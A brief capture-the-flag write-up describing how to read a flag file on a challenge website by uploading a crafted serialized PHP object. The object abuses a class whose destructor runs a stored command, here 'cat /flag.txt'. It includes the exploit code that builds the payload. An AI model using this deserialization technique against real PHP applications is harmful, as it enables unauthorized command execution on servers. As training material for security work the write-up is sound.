## Challange
Read the flag `flag.txt`. 
## Solution
In this website we can download the user as serialized object and then uploaded deserializing it. In data.php is present `Challange` class which is never used in the code but has two methods `start()` and `stop()` which can execute commands. The `start()` method is never invoked, but `stop()` is called when `__decostruct`. If we craft the content of the upload file by serializing the class in this way:
```php
<?php

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd="cat /flag.txt";
}

$r = new Challenge();
echo serialize($r);

?>
```
We obtain the flag when we upload the fake user, because after the data is unserialized the object reference is destroyed, calling the decostructor, executing `cat /flag.txt`.